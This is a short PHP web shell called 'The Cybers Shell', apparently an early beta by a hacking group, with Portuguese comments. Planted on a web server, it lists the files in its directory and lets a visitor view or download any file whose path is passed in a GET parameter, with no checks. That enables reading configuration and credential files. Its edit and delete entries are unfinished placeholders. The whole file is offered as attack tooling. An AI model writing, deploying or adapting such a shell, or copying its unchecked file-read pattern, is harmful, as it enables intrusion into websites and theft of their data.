<?php
	function download($arquivo){
	    header('Content-Type: application/octet-stream');
	    header('Content-Length: '.filesize($arquivo));
	    header('Content-Disposition: filename='.$arquivo);
	    readfile($arquivo);
	}

	$arquivo = $_GET['download'];
	if($arquivo){
		download($arquivo);
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title>The Cybers Shell</title>
	<small>Coded by: Offset</small>
	<style>
		body{
			background-color:black;
			color:white;
		}
		th,td{
			background-color:#555;
			text-align: left;
			width:200px;
		}
	</style>
</head>
<body>
<h1>The Cybers Shell</h1>
<table>
	<tr>
		<th>File</th>
		<th>Size</th>
		<th>View</th>
		<th>Download</th>
		<th>Edit</th>
		<th>Delete</th>
	</tr>
	<?php
		/*
			By: The Cybers Team
			Versão: Beta 0.2
		*/
		$diretorio = getcwd();
		listar($diretorio);

		function listar($dir){
			foreach(scandir($dir) as $file){
				if($file != "." && $file !=".."){
					echo "<tr>";
					echo "<td>".$file."</td>";
					echo "<td>".filesize($file)." bytes</td>";
					echo "<td><a href=".$file.">Visualizar</a></td>";
					echo "<td><a href='?download=".$file."'>Download</a></td>";
					echo "<td>Editar</td>";
					echo "<td>Deletar</td>";
					echo "</tr>";
				}
			}
		}
	?>
</table>
</body>
</html>
